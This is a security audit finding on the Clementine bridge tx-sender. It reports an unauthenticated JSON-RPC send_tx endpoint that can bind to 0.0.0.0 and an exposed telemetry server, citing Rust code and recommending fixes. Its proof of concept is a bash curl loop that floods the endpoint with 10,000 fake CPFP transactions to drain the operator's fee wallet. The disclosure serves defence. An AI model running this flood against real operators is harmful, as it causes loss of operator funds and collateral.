### Title
Unauthenticated tx-sender JSON-RPC Server Allows Internet-Accessible Transaction Queue Manipulation — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone `clementine-tx-sender` JSON-RPC server exposes `send_tx` (and `send_citrea_tx`) over plain HTTP with **no authentication, no TLS, and no rate limiting**. The configuration layer explicitly permits binding to `0.0.0.0`. When deployed with `TX_SENDER_JSONRPC_BIND=0.0.0.0`, any internet-reachable host can enqueue arbitrary transactions with `FeePayingType::CPFP`, causing the tx-sender to create fee-payer UTXOs from the operator's wallet for each queued entry. Exhausting the fee-paying wallet prevents the operator from broadcasting time-critical bridge transactions (kickoff, challenge, reimburse) within their timelocks, resulting in loss of operator collateral or reimbursement outputs.

---

### Finding Description

**Root cause 1 — No authentication on the JSON-RPC server.**

`start_jsonrpc_server` builds a plain `jsonrpsee` HTTP server with only a body-size cap and no credential check:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The registered `send_tx` handler accepts any caller without verifying identity:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    ...
    client.insert_try_to_send(...).await
``` [2](#0-1) 

**Root cause 2 — Code explicitly allows `0.0.0.0` as a valid bind address.**

The config parser accepts `0.0.0.0` without requiring any authentication to be configured alongside it:

```rust
let bind = env_optional("TX_SENDER_JSONRPC_BIND")
    .unwrap_or_else(|| "127.0.0.1".to_string());
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(...);
}
Ok(TxSenderJsonRpcConfig { bind, port })
``` [3](#0-2) 

**Root cause 3 — `TelemetryConfig` defaults to `0.0.0.0`.**

The Prometheus metrics HTTP server also binds to `0.0.0.0:8081` by default with no authentication, leaking operational state (transaction counts, fee rates, round/kickoff progress) to any internet observer:

```rust
impl Default for TelemetryConfig {
    fn default() -> Self {
        Self { host: "0.0.0.0".to_string(), port: 8081 }
    }
}
``` [4](#0-3) 

This default is propagated into every shipped config file and the `run.sh` launcher: [5](#0-4) [6](#0-5) [7](#0-6) 

---

### Impact Explanation

**tx-sender JSON-RPC (primary impact — Medium/High):**

The tx-sender manages the operator's fee-paying wallet. When `send_tx` is called with `fee_paying_type: CPFP`, the tx-sender loop creates a child fee-payer UTXO from the operator's wallet for every queued entry: [8](#0-7) 

An attacker who can reach the JSON-RPC port can:
1. Submit thousands of syntactically valid but unconfirmable transactions with `FeePayingType::CPFP`.
2. Force the tx-sender to create fee-payer UTXOs for each, draining the operator's wallet.
3. Starve legitimate bridge transactions — kickoff, challenge, reimburse — of fee-paying capacity.
4. Cause the operator to miss timelocks defined in the protocol paramset (e.g., `operator_challenge_timeout_timelock`, `operator_reimburse_timelock`), resulting in loss of `OPERATOR_CHALLENGE_AMOUNT` collateral (~130,000,000 sat in regtest) or reimbursement outputs.

The operator's `insert_try_to_send` calls for critical bridge transactions share the same fee-payer wallet: [9](#0-8) 

**Telemetry (secondary impact — Low/Informational):**

The unauthenticated Prometheus endpoint leaks operational metrics (transaction states, fee rates, round progress) to any internet observer, aiding targeted attacks. This does not directly cause fund loss. [10](#0-9) 

---

### Likelihood Explanation

- The tx-sender JSON-RPC server is a documented, production-ready standalone binary (`crates/clementine-tx-sender/src/main.rs`).
- The code explicitly validates and permits `0.0.0.0` as a bind address — this is not an undocumented edge case.
- There is no rate limiting on the JSON-RPC server.
- The `MAX_JSONRPC_REQUEST_BODY_SIZE` of 50 MB limits individual request size but not request count.
- An operator deploying the standalone tx-sender in a Docker/cloud environment where `0.0.0.0` is the natural bind address (e.g., behind a load balancer or in a container network) would expose this endpoint without any code-level protection. [11](#0-10) 

---

### Recommendation

1. **Add authentication to the JSON-RPC server.** At minimum, require a shared secret (bearer token or HTTP Basic Auth) when `TX_SENDER_JSONRPC_BIND=0.0.0.0`. Reject the configuration at startup if `0.0.0.0` is set without an authentication credential.

2. **Add rate limiting.** Use `jsonrpsee`'s `ServerBuilder` rate-limiting middleware or an external reverse proxy to cap requests per IP.

3. **Restrict the default bind address.** Change the code to reject `0.0.0.0` unless an explicit authentication mechanism is also configured, or remove `0.0.0.0` as a valid option entirely and require a reverse proxy for external access.

4. **Restrict the telemetry server.** Change `TelemetryConfig::default()` to bind to `127.0.0.1` instead of `0.0.0.0`, and update all shipped config files accordingly. [4](#0-3) 

---

### Proof of Concept

With `TX_SENDER_JSONRPC_BIND=0.0.0.0` and `TX_SENDER_JSONRPC_PORT=3030`:

```bash
# Craft a syntactically valid but unconfirmable Bitcoin transaction (spends a nonexistent UTXO)
FAKE_TX_HEX="02000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0100e1f50500000000160014$(python3 -c 'print("00"*20)')00000000"

# Flood the tx-sender queue from the internet
for i in $(seq 1 10000); do
  curl -s -X POST http://<OPERATOR_IP>:3030 \
    -H 'content-type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",\"params\":[{
      \"tx_metadata\": null,
      \"signed_tx_hex\": \"$FAKE_TX_HEX\",
      \"fee_paying_type\": \"CPFP\",
      \"rbf_signing_info\": null,
      \"cancel_outpoints\": [],
      \"cancel_txids\": [],
      \"activate_txids\": [],
      \"activate_outpoints\": []
    }]}" &
done
wait
# tx-sender now attempts CPFP for 10,000 entries, creating fee-payer UTXOs from the operator wallet.
# Operator wallet is drained; legitimate kickoff/challenge/reimburse transactions cannot be fee-bumped.
``` [12](#0-11) [13](#0-12)

### Citations

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L16-17)
```rust
const JSONRPC_INTERNAL_ERROR_CODE: i32 = -32_000;
const MAX_JSONRPC_REQUEST_BODY_SIZE: u32 = 50 * 1024 * 1024;
```

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L42-111)
```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L197-212)
```rust
        #[cfg(feature = "json-rpc")]
        let jsonrpc = {
            let port = env_parse_optional::<u16>("TX_SENDER_JSONRPC_PORT")?;
            port.map(|port| {
                let bind = env_optional("TX_SENDER_JSONRPC_BIND")
                    .unwrap_or_else(|| "127.0.0.1".to_string());
                if bind != "127.0.0.1" && bind != "0.0.0.0" {
                    return Err(BridgeError::EnvVarMalformed(
                        "TX_SENDER_JSONRPC_BIND",
                        "bind must be either 127.0.0.1 or 0.0.0.0".to_string(),
                    ));
                }
                Ok(TxSenderJsonRpcConfig { bind, port })
            })
            .transpose()?
        };
```

**File:** crates/clementine-config/src/telemetry.rs (L14-20)
```rust
impl Default for TelemetryConfig {
    fn default() -> Self {
        Self {
            host: "0.0.0.0".to_string(),
            port: 8081,
        }
    }
```

**File:** scripts/run.sh (L91-92)
```shellscript
export TELEMETRY_HOST=0.0.0.0
export TELEMETRY_PORT=8081
```

**File:** scripts/docker/configs/regtest/.env.regtest (L72-73)
```text
TELEMETRY_HOST=0.0.0.0
TELEMETRY_PORT=9000
```

**File:** scripts/docker/configs/testnet4/bridge_config.toml (L86-88)
```text
[telemetry]
host = "0.0.0.0"
port = 8081
```

**File:** crates/clementine-tx-sender/src/task.rs (L83-91)
```rust
                    let bind: std::net::IpAddr = rpc_cfg.bind.parse().map_err(|e| {
                        BridgeError::ConfigError(format!("Invalid TX_SENDER_JSONRPC_BIND: {e}"))
                    })?;
                    let addr = std::net::SocketAddr::new(bind, rpc_cfg.port);

                    let server =
                        crate::jsonrpc::server::start_jsonrpc_server(tx_sender.client(), addr)
                            .await?;
                    jsonrpc_handle = Some(server);
```

**File:** core/src/operator.rs (L1170-1189)
```rust
        // send ready to reimburse tx
        self.tx_sender
            .insert_try_to_send(
                dbtx,
                Some(TxMetadata {
                    tx_type: TransactionType::ReadyToReimburse,
                    operator_xonly_pk: Some(self.signer.xonly_public_key),
                    round_idx: Some(current_round_index),
                    kickoff_idx: None,
                    deposit_outpoint: None,
                }),
                ready_to_reimburse_tx,
                FeePayingType::CPFP,
                None,
                &[],
                &[],
                &[],
                &activation_prerequisites,
            )
            .await?;
```

**File:** core/src/utils.rs (L27-47)
```rust
pub fn initialize_telemetry(config: &TelemetryConfig) -> Result<(), BridgeError> {
    let telemetry_addr: SocketAddr = format!("{}:{}", config.host, config.port)
        .parse()
        .unwrap_or_else(|_| {
            tracing::warn!(
                "Invalid telemetry address: {}:{}, using default address: 127.0.0.1:8081",
                config.host,
                config.port
            );
            SocketAddr::from((Ipv4Addr::new(127, 0, 0, 1), 8081))
        });

    tracing::debug!("Initializing telemetry at {}", telemetry_addr);

    let builder = PrometheusBuilder::new().with_http_listener(telemetry_addr);

    builder
        .install()
        .map_err(|e| eyre::eyre!("Failed to initialize telemetry: {}", e))?;

    Ok(())
```
